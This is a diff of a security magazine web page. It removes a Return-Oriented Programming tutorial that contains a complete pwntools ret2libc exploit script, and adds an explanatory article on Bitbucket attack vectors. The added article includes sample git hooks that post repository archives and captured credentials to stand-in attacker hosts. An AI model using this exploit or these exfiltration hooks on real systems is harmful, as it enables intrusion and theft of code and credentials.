@@ -124,6 +124,18 @@ img{display:block;max-width:100%}
   .mag-nav-main{padding:14px 20px}
   .post-grid{grid-template-columns:1fr}
 }
+@media(max-width:560px){
+  .mag-cta{display:none}
+}
+/* the magazine's carousels are styled further down the page; while it streams in they would
+   lay out full-width and phones lock the zoom at ~700px. Constrain them from the <head>. */
+.grid-cinematic,.shelf-track{overflow-x:auto;max-width:100%}
+@media(max-width:768px){
+  html,body{overflow-x:hidden}
+  .article-content img,.article-content video,.article-content iframe{max-width:100%;height:auto}
+  .article-content table{display:block;max-width:100%;overflow-x:auto}
+  .article-content pre{max-width:100%;overflow-x:auto}
+}
 @media(max-width:480px){
   .card-img-wrap,.card-img-placeholder{height:180px}
 }
@@ -1230,7 +1242,7 @@ j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
     }
 }
 </style>
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector#article","headline":"Bitbucket Attack Vector — HADESS Magazine","description":"Introduction\n\n\n\nBitbucket, a widely used Git repository management solution, provides a platform for developers to manage and collaborate on code. However, its...","url":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector"},"datePublished":"January 17, 2024","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://career.hadess.io/logo-white.png"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2024/01/bitbucket-attack-vector-analysis.jpg"}}]}</script>
+<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector#article","headline":"Bitbucket Attack Vector — HADESS Magazine","description":"Introduction\n\n\n\nBitbucket, a widely used Git repository management solution, provides a platform for developers to manage and collaborate on code. However, its...","url":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector","mainEntityOfPage":{"@type":"WebPage","@id":"https://hadesssecurity.github.io/blog/read/bitbucket-attack-vector"},"datePublished":"January 17, 2024","author":{"@type":"Organization","name":"hadess"},"publisher":{"@type":"Organization","name":"HADESS","url":"https://hadesssecurity.github.io","logo":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2022/06/Hadess-Cybersecurity.jpg"}},"image":{"@type":"ImageObject","url":"https://hadesssecurity.github.io/wp-content/uploads/2024/01/bitbucket-attack-vector-analysis.jpg"}}]}</script>
 <!-- Force our dark theme; hide ALL default WP theme output -->
 <style>
 html,body{background:var(--bg)!important;color:var(--text)!important;font-family:var(--font)!important}
@@ -1283,14 +1295,13 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <span>Friday, October 2, 2026</span>
     </div>
     <div class="mag-nav-top-right">
-      <a href="mailto:career@hadess.io">Contact</a>
-      <a href="https://career.hadess.io/privacy">Privacy</a>
-      <a href="https://career.hadess.io/terms">Terms</a>
+      <a href="mailto:security@hadess.io">Contact</a>
+      <a href="/products/">Products &amp; Services</a>
       <div class="mag-social">
         <a href="https://www.linkedin.com/company/hadess-security/" target="_blank" rel="noopener noreferrer" aria-label="LinkedIn"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M20.447 20.452h-3.554v-5.569c0-1.328-.027-3.037-1.852-3.037-1.853 0-2.136 1.445-2.136 2.939v5.667H9.351V9h3.414v1.561h.046c.477-.9 1.637-1.85 3.37-1.85 3.601 0 4.267 2.37 4.267 5.455v6.286zM5.337 7.433a2.062 2.062 0 01-2.063-2.065 2.064 2.064 0 112.063 2.065zm1.782 13.019H3.555V9h3.564v11.452zM22.225 0H1.771C.792 0 0 .774 0 1.729v20.542C0 23.227.792 24 1.771 24h20.451C23.2 24 24 23.227 24 22.271V1.729C24 .774 23.2 0 22.222 0h.003z"/></svg></a>
         <a href="https://x.com/Hadess_security" target="_blank" rel="noopener noreferrer" aria-label="X"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M18.244 2.25h3.308l-7.227 8.26 8.502 11.24H16.17l-5.214-6.817L4.99 21.75H1.68l7.73-8.835L1.254 2.25H8.08l4.713 6.231zm-1.161 17.52h1.833L7.084 4.126H5.117z"/></svg></a>
         <a href="https://github.com/hadessCs" target="_blank" rel="noopener noreferrer" aria-label="GitHub"><svg fill="currentColor" viewBox="0 0 24 24"><path d="M12 0c-6.626 0-12 5.373-12 12 0 5.302 3.438 9.8 8.207 11.387.599.111.793-.261.793-.577v-2.234c-3.338.726-4.033-1.416-4.033-1.416-.546-1.387-1.333-1.756-1.333-1.756-1.089-.745.083-.729.083-.729 1.205.084 1.839 1.237 1.839 1.237 1.07 1.834 2.807 1.304 3.492.997.107-.775.418-1.305.762-1.604-2.665-.305-5.467-1.334-5.467-5.931 0-1.311.469-2.381 1.236-3.221-.124-.303-.535-1.524.117-3.176 0 0 1.008-.322 3.301 1.23A11.509 11.509 0 0112 5.803c1.02.005 2.047.138 3.006.404 2.291-1.552 3.297-1.23 3.297-1.23.653 1.653.242 2.874.118 3.176.77.84 1.235 1.911 1.235 3.221 0 4.609-2.807 5.624-5.479 5.921.43.372.823 1.102.823 2.222v3.293c0 .319.192.694.801.576C20.566 21.797 24 17.3 24 12c0-6.627-5.373-12-12-12z"/></svg></a>
-        <a href="mailto:career@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
+        <a href="mailto:security@hadess.io" aria-label="Email"><svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><rect x="2" y="4" width="20" height="16" rx="2"/><path d="m22 7-8.97 5.7a1.94 1.94 0 01-2.06 0L2 7"/></svg></a>
       </div>
     </div>
   </div>
@@ -1308,16 +1319,16 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
               <a href="/blog?cat=104">Skills &amp; Certifications</a>
               <a href="/blog?cat=76">Career Guide</a>
               <a href="/blog?cat=23">White Paper</a>
-            <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
+            <a href="/products/">Products &amp; Services</a>
     </div>
     <a href="/blog/search" class="mag-search-btn">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35" stroke-linecap="round"/></svg>
       Search...
       <kbd>/</kbd>
     </a>
-    <a href="https://career.hadess.io/login" class="mag-cta">
+    <a href="/products/#contact" class="mag-cta">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M13 10V3L4 14h7v7l9-11h-7z" stroke-linecap="round" stroke-linejoin="round"/></svg>
-      Launch Career Platform
+      Talk to an Expert
     </a>
     <button class="mag-hamburger" onclick="document.getElementById('mobileMenu').classList.add('open')">
       <svg fill="none" stroke="currentColor" stroke-width="2" viewBox="0 0 24 24"><path d="M4 6h16M4 12h16M4 18h16" stroke-linecap="round"/></svg>
@@ -1334,8 +1345,8 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
       <a href="/blog?cat=76">Career Guide</a>
       <a href="/blog?cat=23">White Paper</a>
     <a href="/blog/search">Search</a>
-  <a href="https://career.hadess.io/games/">Hack &amp; Learn</a>
-  <a href="https://career.hadess.io/login" style="color:var(--gold)">Launch Career Platform</a>
+  <a href="/products/">Products &amp; Services</a>
+  <a href="/products/#contact" style="color:var(--gold)">Talk to an Expert</a>
 </div>
 
 <!-- ═══ PAGE-SPECIFIC STYLES ═══ -->
@@ -1547,1464 +1558,962 @@ body>*:not(#hadess-mag):not(script):not(style):not(link):not(noscript):not(.emai
   <div class="article-content-col">
     <div class="article-content" data-pagefind-body data-pagefind-meta="image:/wp-content/uploads/2024/01/bitbucket-attack-vector-analysis.jpg">
       
-<p class="wp-block-paragraph">&#8220;ROP Gadget Unleashed&#8221; delves into the intricacies of Return-Oriented Programming (ROP) and its significance in modern exploitation techniques. The article elucidates how attackers leverage existing code snippets, or &#8220;gadgets,&#8221; within a program&#8217;s memory to craft malicious payloads, thus circumventing traditional security mechanisms like Data Execution Prevention (DEP). By chaining these gadgets together, which typically end with a return instruction, adversaries can create a controlled flow of execution that leads to the desired exploit without the need to inject new code. This methodology has emerged as a potent technique for attackers, especially in environments where direct code injection is heavily mitigated.</p>
+<h2 class="wp-block-heading">Introduction</h2>
 
 
 
-<p class="wp-block-paragraph">The article also highlights the importance of identifying and utilizing effective ROP gadgets in penetration testing and exploit development. It discusses various tools and techniques that can be employed to discover ROP gadgets within binary files, emphasizing the necessity of understanding both the architecture and the underlying assembly language of the target application. Furthermore, &#8220;ROP Gadget Unleashed&#8221; underscores the ongoing arms race between security researchers and attackers, showcasing how the development of robust countermeasures against ROP exploits is crucial for maintaining secure systems. By equipping practitioners with knowledge and practical strategies, the article aims to enhance their ability to protect applications against this sophisticated attack vector.</p>
+<p class="wp-block-paragraph">Bitbucket, a widely used Git repository management solution, provides a platform for developers to manage and collaborate on code. However, its extensive functionality and integration capabilities also present numerous attack vectors and surfaces that adversaries might exploit. This APT report outlines potential attack vectors and surfaces within Bitbucket, focusing on the data pipeline, active directory (LDAP), application link, and add-ons.</p>
 
 
 
-<h1 class="wp-block-heading">Overview of Return-Oriented Programming (ROP)</h1>
+<h2 class="wp-block-heading">Attack Vector&nbsp;</h2>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is an advanced exploitation technique that allows attackers to execute code in the presence of security measures like stack canaries and non-executable memory. Instead of injecting malicious code, ROP chains together existing code snippets—called &#8220;gadgets&#8221;—found in a program&#8217;s memory. This method emerged in the mid-2000s, notably highlighted by researchers demonstrating its efficacy against defenses like DEP (Data Execution Prevention). As exploits evolved, ROP became a crucial tool for attackers, enabling them to manipulate program control flow without directly executing injected payloads, thus bypassing many traditional security mechanisms.</p>
+<h3 class="wp-block-heading">1. Data Pipeline:</h3>
 
 
 
-<p class="wp-block-paragraph">Return-Oriented Programming (ROP) is a sophisticated exploitation technique used to bypass modern security defenses like Data Execution Prevention (DEP) and Address Space Layout Randomization (ASLR). Instead of injecting malicious code, ROP reuses existing code snippets, called <strong>gadgets</strong>, found within the memory of a vulnerable program. Gadgets are small sequences of instructions that end in a <code>ret</code> instruction, allowing the attacker to chain them together and control program execution.</p>
+<p class="wp-block-paragraph">Attack Vector:</p>
 
 
 
-<h4 class="wp-block-heading">Step-by-Step ROP Attack Example</h4>
+<p class="wp-block-paragraph">Data Interception: Adversaries may target the data pipeline to intercept, manipulate, or exfiltrate sensitive data.</p>
 
 
 
-<p class="wp-block-paragraph">Below is a detailed explanation of how to construct a ROP chain in a vulnerable program, along with essential commands and code snippets to help guide you through a basic ROP exploit.</p>
+<p class="wp-block-paragraph">Injection Attacks: Injecting malicious code or altering data during transit.</p>
 
 
 
-<h5 class="wp-block-heading">1. Disable ASLR (for easier exploitation in practice)</h5>
+<p class="wp-block-paragraph">Attack Surface:</p>
 
 
 
-<p class="wp-block-paragraph">In many exploit development scenarios, ASLR (Address Space Layout Randomization) can make exploitation harder. You can disable it temporarily using the following command:</p>
+<p class="wp-block-paragraph">API Endpoints: Unauthorized access to API endpoints can lead to data leaks or unauthorized actions.</p>
 
 
 
-<pre class="wp-block-code"><code>echo 0 | sudo tee /proc/sys/kernel/randomize_va_space</code></pre>
+<p class="wp-block-paragraph">Data Transmission: Unsecured data transmission between integrated systems.</p>
 
 
 
-<h5 class="wp-block-heading">2. Find Dependencies and Libraries</h5>
+<p class="wp-block-paragraph">Mitigation:</p>
 
 
 
-<p class="wp-block-paragraph">Use the <code>ldd</code> command to inspect the shared libraries used by the vulnerable binary. This helps you identify where libc or other shared libraries are located in memory.</p>
+<p class="wp-block-paragraph">Implementing robust encryption for data in transit.</p>
 
 
 
-<pre class="wp-block-code"><code>$ ldd vuln-32
-    linux-gate.so.1 (0xf7fd2000)
-    libc.so.6 =&gt; /lib32/libc.so.6 (0xf7dc2000)   # Important: we will use libc later
-    /lib/ld-linux.so.2 (0xf7fd3000)</code></pre>
+<p class="wp-block-paragraph">Ensuring API security through authentication and authorization mechanisms.</p>
 
 
 
-<h5 class="wp-block-heading">3. Locate Gadgets Using ROPgadget</h5>
+<h3 class="wp-block-heading">2. Active Directory &#8211; LDAP:</h3>
 
 
 
-<p class="wp-block-paragraph">The core of any ROP exploit is finding gadgets. These are small chunks of code that perform useful operations (like loading a register or calling a function). For instance, a common gadget is <code>pop rdi; ret</code>, which allows the attacker to set up a function argument before a call to a function like <code>system()</code>.</p>
+<p class="wp-block-paragraph">Attack Vector:</p>
 
 
 
-<p class="wp-block-paragraph">Install and use ROPgadget to find usable gadgets in the binary:</p>
+<p class="wp-block-paragraph">Credential Harvesting: Targeting LDAP to harvest user credentials and gain unauthorized access.</p>
 
 
 
-<pre class="wp-block-code"><code>$ ROPgadget --binary vuln-64 | grep rdi
-0x00000000004011cb : pop rdi ; ret</code></pre>
+<p class="wp-block-paragraph">Privilege Escalation: Exploiting misconfigurations to escalate privileges.</p>
 
 
 
-<p class="wp-block-paragraph">The above command shows that we have found a useful gadget: <code>pop rdi; ret</code> at the address <code>0x4011cb</code>. This gadget will allow us to set up the first argument (RDI register) before calling <code>system()</code>.</p>
+<p class="wp-block-paragraph">Attack Surface:</p>
 
 
 
-<h5 class="wp-block-heading">4. Find System and &#8220;/bin/sh&#8221; Strings in libc</h5>
+<p class="wp-block-paragraph">LDAP Integration: Direct interaction with LDAP might expose it to unauthorized access or exploitation.</p>
 
 
 
-<p class="wp-block-paragraph">Next, we need to find the address of the <code>system()</code> function and the <code>/bin/sh</code> string in libc, which are critical for executing a shell.</p>
+<p class="wp-block-paragraph">User Data: Sensitive user data stored or managed through LDAP.</p>
 
 
 
-<p class="wp-block-paragraph">To find <code>system()</code>:</p>
+<p class="wp-block-paragraph">Mitigation:</p>
 
 
 
-<pre class="wp-block-code"><code>$ readelf -s /lib32/libc.so.6 | grep system
-   1463: 0003cd10   88 FUNC    GLOBAL DEFAULT   13 system</code></pre>
+<p class="wp-block-paragraph">Employing stringent access controls and monitoring for LDAP.</p>
 
 
 
-<p class="wp-block-paragraph">To find the <code>/bin/sh</code> string:</p>
+<p class="wp-block-paragraph">Regularly auditing and updating LDAP configurations.</p>
 
 
 
-<pre class="wp-block-code"><code>$ strings -a -t x /lib32/libc.so.6 | grep /bin/sh
-   18a143 /bin/sh</code></pre>
+<h3 class="wp-block-heading">3. Application Link:</h3>
 
 
 
-<h5 class="wp-block-heading">5. Create the ROP Chain</h5>
+<p class="wp-block-paragraph">Attack Vector:</p>
 
 
 
-<p class="wp-block-paragraph">Using the gadgets and addresses we found, we can now build the ROP chain that will exploit the vulnerable program and give us a shell.</p>
+<p class="wp-block-paragraph">Link Exploitation: Exploiting application links to gain unauthorized access or disrupt services.</p>
 
 
 
-<p class="wp-block-paragraph">Here’s the full Python exploit script using <code>pwntools</code>:</p>
+<p class="wp-block-paragraph">Data Manipulation: Altering data being shared or transferred between linked applications.</p>
 
 
 
-<pre class="wp-block-code"><code>from pwn import *
+<p class="wp-block-paragraph">Attack Surface:</p>
 
-# Start the vulnerable process
-p = process('./vuln-64')
 
-# Base address of libc (can be found or leaked in real-world scenarios)
-libc_base = 0x7ffff7de5000
-system = libc_base + 0x48e20     # Address of system() in libc
-binsh = libc_base + 0x18a143     # Address of "/bin/sh" string in libc
 
-# ROP gadget addresses
-POP_RDI = 0x4011cb  # Address of pop rdi; ret gadget
+<p class="wp-block-paragraph">Inter-Application Communication: The communication channel between linked applications.</p>
 
-# Constructing the payload
-payload = b'A' * 72         # Padding to reach return address
-payload += p64(POP_RDI)     # Gadget to set up the RDI register
-payload += p64(binsh)       # Pointer to the "/bin/sh" string
-payload += p64(system)      # Address of system() to call system("/bin/sh")
-payload += p64(0x0)         # Return address after system() is called (can be arbitrary)
 
-# Send the payload
-p.clean()
-p.sendline(payload)
-p.interactive()</code></pre>
 
+<p class="wp-block-paragraph">Authentication Tokens: Tokens used for authenticating linked applications.</p>
 
 
-<h4 class="wp-block-heading">Breakdown of the Exploit</h4>
 
+<p class="wp-block-paragraph">Mitigation:</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Padding</strong>: We use 72 bytes (<code>'A' * 72</code>) to overflow the buffer and reach the return address.</li>
 
+<p class="wp-block-paragraph">Ensuring secure and encrypted communication between linked applications.</p>
 
 
-<li><strong>POP_RDI Gadget</strong>: The <code>pop rdi; ret</code> gadget allows us to control the value of the <code>rdi</code> register (the first argument for system()).</li>
 
+<p class="wp-block-paragraph">Implementing token security and regularly rotating authentication tokens.</p>
 
 
-<li><strong>/bin/sh</strong>: We pass the <code>/bin/sh</code> string as the first argument to <code>system()</code>.</li>
 
+<h3 class="wp-block-heading">4. Add-Ons (JAR):</h3>
 
 
-<li><strong>System Call</strong>: We call <code>system()</code> with <code>/bin/sh</code>, resulting in spawning a shell.</li>
-</ul>
 
+<p class="wp-block-paragraph">Attack Vector:</p>
 
 
-<h5 class="wp-block-heading">6. Running the Exploit</h5>
 
+<p class="wp-block-paragraph">Malicious Add-On: Introducing a malicious add-on to compromise Bitbucket.</p>
 
 
-<p class="wp-block-paragraph">To test the exploit, compile your vulnerable program and run the Python script:</p>
 
+<p class="wp-block-paragraph">Add-On Vulnerabilities: Exploiting vulnerabilities within legitimate add-ons.</p>
 
 
-<figure class="wp-block-table"><table class="has-fixed-layout"><thead><tr><th><strong>Step</strong></th><th><strong>Command</strong></th></tr></thead><tbody><tr><td>Disable ASLR</td><td>`echo 0</td></tr><tr><td>Check shared libraries</td><td><code>ldd vuln-32</code></td></tr><tr><td>Find gadgets</td><td>`ROPgadget &#8211;binary vuln-64</td></tr><tr><td>Find system() in libc</td><td>`readelf -s /lib32/libc.so.6</td></tr><tr><td>Find /bin/sh string</td><td>`strings -a -t x /lib32/libc.so.6</td></tr><tr><td>Compile vulnerable program</td><td><code>gcc -m64 -o vuln-64 vuln-64.c</code></td></tr><tr><td>Exploit using Python script</td><td><code>python3 exploit.py</code></td></tr></tbody></table></figure>
 
+<p class="wp-block-paragraph">Attack Surface:</p>
 
 
-<h4 class="wp-block-heading">Significance of ROP in Modern Exploits</h4>
 
+<p class="wp-block-paragraph">Add-On Marketplace: The platform through which add-ons are distributed and installed.</p>
 
 
-<p class="wp-block-paragraph">ROP plays a pivotal role in bypassing contemporary security measures by leveraging existing code to create dynamic execution paths, making it difficult for traditional defenses to detect and mitigate. In an era where many systems implement protections like Address Space Layout Randomization (ASLR) and stack canaries, ROP allows attackers to circumvent these barriers by using the program&#8217;s own code against it. For defenders, understanding ROP is essential to developing effective countermeasures and improving the overall security posture. This ongoing cat-and-mouse game underscores the importance of ROP not only as a tool for attackers but also as a critical area of focus for cybersecurity professionals aiming to protect systems from sophisticated exploits.</p>
 
+<p class="wp-block-paragraph">Add-On Permissions: The permissions and access granted to installed add-ons.</p>
 
 
-<p class="wp-block-paragraph">https://github.com/alanvivona/pwnshop and https://github.com/Rizer0/Ropdump</p>
 
+<p class="wp-block-paragraph">Mitigation:</p>
 
 
-<h3 class="wp-block-heading">ROP Gadgets</h3>
 
+<p class="wp-block-paragraph">Validating and verifying add-ons before installation.</p>
 
 
-<p class="wp-block-paragraph">ROP gadgets are short sequences of instructions that end with a &#8220;return&#8221; instruction, allowing the control flow to jump to the next gadget in a ROP chain. The purpose of these gadgets is to enable an attacker to construct a payload that can manipulate the program&#8217;s execution flow without injecting any new code, effectively utilizing the existing code within a target application or library. This technique is particularly valuable in scenarios where memory protections are in place, as it allows for exploitation without violating these defenses.</p>
 
+<p class="wp-block-paragraph">Limiting add-on permissions to the least privilege necessary.</p>
 
 
-<p class="wp-block-paragraph">Extracting ROP gadgets involves analyzing the binary code of a target application, typically using tools designed for disassembly and reverse engineering. Attackers often employ tools like ROPgadget, Ropper, or custom scripts to scan for sequences of instructions that meet the criteria for gadgets. This process includes identifying potential gadgets by searching through the binary for instructions that lead to a return statement, then cataloging these sequences to facilitate the construction of ROP chains. By carefully selecting and chaining these gadgets, attackers can orchestrate complex exploits tailored to bypass security measures and achieve their objectives.</p>
 
+<p class="wp-block-paragraph">Threat Actor Tactics, Techniques, and Procedures (TTPs):</p>
 
 
-<h4 class="wp-block-heading">1. <strong>Address Space Layout Randomization (ASLR)</strong></h4>
 
+<p class="wp-block-paragraph">Initial Access: Utilizing stolen credentials or exploiting vulnerabilities for initial access.</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Randomizes memory addresses to make exploitation harder.</li>
 
+<p class="wp-block-paragraph">Execution: Deploying malicious add-ons or scripts for execution within the environment.</p>
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>Memory leaks can reveal address locations.</li>
 
+<p class="wp-block-paragraph">Persistence: Exploiting application links or add-ons to maintain persistent access.</p>
 
 
-<li>If certain libraries or sections are not fully randomized, ROP gadgets can still be located.</li>
-</ul>
-</li>
-</ul>
 
+<p class="wp-block-paragraph">Privilege Escalation: Exploiting misconfigurations or vulnerabilities within LDAP or add-ons.</p>
 
 
-<h4 class="wp-block-heading">2. <strong>Data Execution Prevention (DEP)</strong></h4>
 
+<p class="wp-block-paragraph">Defense Evasion: Manipulating logs or employing obfuscation techniques.</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Marks memory regions (e.g., stack, heap) as non-executable.</li>
 
+<p class="wp-block-paragraph">Credential Access: Targeting LDAP or API tokens for credential access.</p>
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP reuses existing executable code, bypassing the need to inject new code.</li>
-</ul>
-</li>
-</ul>
 
+<p class="wp-block-paragraph">Discovery: Identifying valuable data or further exploit vectors within the data pipeline.</p>
 
 
-<h4 class="wp-block-heading">3. <strong>Stack Canaries</strong></h4>
 
+<p class="wp-block-paragraph">Lateral Movement: Utilizing application links or exploiting add-ons to move laterally.</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Detects buffer overflows by placing a random value before the return address.</li>
 
+<p class="wp-block-paragraph">Impact: Manipulating, deleting, or exfiltrating data to impact the organization.</p>
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>If the canary is leaked, the attacker can overwrite the return address without detection.</li>
-</ul>
-</li>
-</ul>
 
+<h2 class="wp-block-heading">Git Hook Vulnerabilities</h2>
 
 
-<h4 class="wp-block-heading">4. <strong>Control Flow Integrity (CFI)</strong></h4>
 
+<p class="wp-block-paragraph">Git hooks, a fundamental feature in Bitbucket, offer developers the flexibility to streamline workflows through automation. However, these hooks also harbor the potential for abuse by threat actors, presenting security risks on both the server-side and client-side of Bitbucket.</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Ensures the control flow follows valid paths in the program.</li>
 
+<h3 class="wp-block-heading">Server-Side Git Hook Abuses:</h3>
 
 
-<li><strong>ROP Bypass</strong>:
-<ul class="wp-block-list">
-<li>ROP gadgets can mimic valid control flows, making it difficult for CFI to detect.</li>
-</ul>
-</li>
-</ul>
 
+<p class="wp-block-paragraph"><strong>1. Malicious Code Execution:</strong> Server-side Git hooks, such as pre-receive and post-receive hooks, can be abused by attackers to execute unauthorized code on the Bitbucket server. The following is a non-functional example of a malicious pre-receive hook:</p>
 
 
-<figure class="wp-block-embed"><div class="wp-block-embed__wrapper">
-https://github.com/xct/ropstar
-</div></figure>
 
+<pre class="wp-block-code"><code>#!/bin/bash
 
+# A non-functional malicious pre-receive hook
 
-<h4 class="wp-block-heading">Types of ROP Gadgets</h4>
+while read oldrev newrev refname; do
 
+  # Insert malicious code here
 
+done</code></pre>
 
-<p class="wp-block-paragraph">ROP gadgets can be classified into several types, each serving distinct purposes in an exploit.</p>
 
 
+<p class="wp-block-paragraph">In reality, this script could run malicious code that compromises the server&#8217;s integrity or exfiltrates sensitive data.</p>
 
-<p class="wp-block-paragraph">POP Gadgets are fundamental for manipulating the stack and registers, as they typically contain one or more POP instructions that load values from the stack into registers. This is essential for setting up the right context for later operations.</p>
 
 
+<p class="wp-block-paragraph"><strong>2. Data Exfiltration:</strong> Malicious actors can manipulate server-side hooks to steal sensitive information from Bitbucket repositories. For instance, a modified post-receive hook might transmit confidential data to an external server:</p>
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Load values from the stack into registers.</li>
 
 
+<pre class="wp-block-code"><code>#!/bin/bash
+# A non-functional example of a malicious post-receive hook for data exfiltration
+while read oldrev newrev refname; do
+git archive --format=zip --output=/tmp/data.zip $newrev
 
-<li><strong>Example</strong>: <code>pop rdi; ret</code></li>
+  curl -X POST -F "file=@/tmp/data.zip" https://attacker-server.com/upload
 
+done</code></pre>
 
 
-<li><strong>Usage</strong>: Essential for setting up parameters before function calls.</li>
-</ul>
 
+<p class="wp-block-paragraph">This example demonstrates how attackers could exfiltrate data from a repository.</p>
 
 
-<p class="wp-block-paragraph">RET Gadgets are the simplest form of gadgets, consisting of just a RET instruction. They serve to redirect control flow, allowing the execution to jump to the next gadget in a chain, thereby maintaining the sequence of operations.</p>
 
+<p class="wp-block-paragraph">3. Data Tampering: Threat actors might manipulate server-side hooks to tamper with data within a repository. They can modify post-receive hooks to alter code or data after it has been pushed. Although this example is non-functional, it demonstrates how data tampering might occur:</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Control flow redirection using <code>ret</code> instructions.</li>
 
+<pre class="wp-block-code"><code>#!/bin/bash
 
+# A non-functional malicious post-receive hook for data tampering
 
-<li><strong>Usage</strong>: Used to jump to the next gadget in a chain, ensuring the sequence of operations.</li>
-</ul>
+while read oldrev newrev refname; do
 
+  if &#91; "$refname" == "refs/heads/master" ]; then
 
+    # Insert code to modify repository data here
 
-<p class="wp-block-paragraph">MOV Gadgets facilitate data transfer between registers or between registers and memory. By utilizing these gadgets, attackers can efficiently move values needed for calculations or function parameters, crucial for shaping the exploit&#8217;s behavior.</p>
+  fi
 
+done</code></pre>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Move data between registers or memory.</li>
 
+<p class="wp-block-paragraph">In a real-world scenario, this script could introduce vulnerabilities or compromise the integrity of a repository.</p>
 
 
-<li><strong>Usage</strong>: Useful for setting up function arguments or controlling data flow during the exploit.</li>
-</ul>
 
+<h3 class="wp-block-heading">Client-Side Git Hook Abuses:</h3>
 
 
-<p class="wp-block-paragraph">Arithmetic Gadgets perform various mathematical operations, including addition, subtraction, multiplication, and division. These gadgets enable dynamic computation of values during the exploit, allowing for more complex manipulations.</p>
 
+<p class="wp-block-paragraph"><strong>1. Credential Theft:</strong><strong> </strong>Client-side Git hooks can be exploited to steal user credentials. Below is an example of a malicious pre-push hook:</p>
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Perform arithmetic operations like addition, subtraction, or XOR.</li>
 
+<pre class="wp-block-code"><code>#!/bin/bash
 
+# A non-functional example of a malicious client-side pre-push hook for credential theft
 
-<li><strong>Usage</strong>: Can dynamically compute values during exploitation.</li>
-</ul>
+read -p "Enter your username: " username
 
+read -sp "Enter your password: " password
 
+# Send the captured credentials to a remote server (non-functional)
 
-<p class="wp-block-paragraph">Lastly, System Call Gadgets are designed to invoke system calls, enabling the exploit to interact directly with the operating system. This is vital for performing actions like spawning shells or manipulating files, ultimately achieving the attacker’s goals. Together, these gadget types create a versatile toolkit for sophisticated ROP attacks.</p>
+curl -X POST -d "username=$username&amp;password=$password" https://malicious-server.com/steal.php</code></pre>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Purpose</strong>: Trigger system calls to interact with the operating system (e.g., spawn a shell).</li>
+<p class="wp-block-paragraph">While this script may not work, it illustrates how an attacker might attempt to steal user credentials.</p>
 
 
 
-<li><strong>Usage</strong>: These gadgets are vital for achieving the final goals of an exploit.</li>
-</ul>
+<p class="wp-block-paragraph"><strong>2. Code Injection:</strong><strong> </strong>Threat actors can manipulate client-side hooks to inject malicious code into a repository without a developer&#8217;s knowledge. Here&#8217;s a simplified example of a malicious post-checkout hook:</p>
 
 
 
-<h3 class="wp-block-heading">Finding ROP Gadgets</h3>
+<p class="wp-block-paragraph">#!/bin/bash</p>
 
 
 
-<p class="wp-block-paragraph">Several tools help find and chain ROP gadgets:</p>
+<p class="wp-block-paragraph"># A non-functional example of a malicious client-side post-checkout hook for code injection</p>
 
 
 
-<h4 class="wp-block-heading"><strong>ROPgadget.py</strong></h4>
+<p class="wp-block-paragraph">echo &#8220;Malicious code injection&#8221; &gt;&gt; compromised-file.js</p>
 
 
 
-<figure class="wp-block-image size-full"><img fetchpriority="high" decoding="async" width="883" height="960" src="/wp-content/uploads/2024/09/image-10.png" alt="" class="wp-image-8829" srcset="/wp-content/uploads/2024/09/image-10.png 883w, /wp-content/uploads/2024/09/image-10-276x300.png 276w, /wp-content/uploads/2024/09/image-10-768x835.png 768w" sizes="(max-width: 883px) 100vw, 883px" /></figure>
+<p class="wp-block-paragraph">This hypothetical script could insert unauthorized code into a developer&#8217;s workspace.</p>
 
 
 
-<ul class="wp-block-list">
-<li><strong>Usage</strong>: A Python tool that finds ROP gadgets in binaries across architectures like x86, ARM, and MIPS.</li>
-</ul>
+<p class="wp-block-paragraph"><strong>3. Propagation of Malware:</strong><strong> </strong>Client-side hooks can also be abused to propagate malware within a development team. A malicious pre-clone hook, though non-functional, showcases how an attacker might attempt to distribute malware:</p>
 
 
 
-<pre class="wp-block-code"><code>ROPgadget.py --binary &lt;binary&gt;
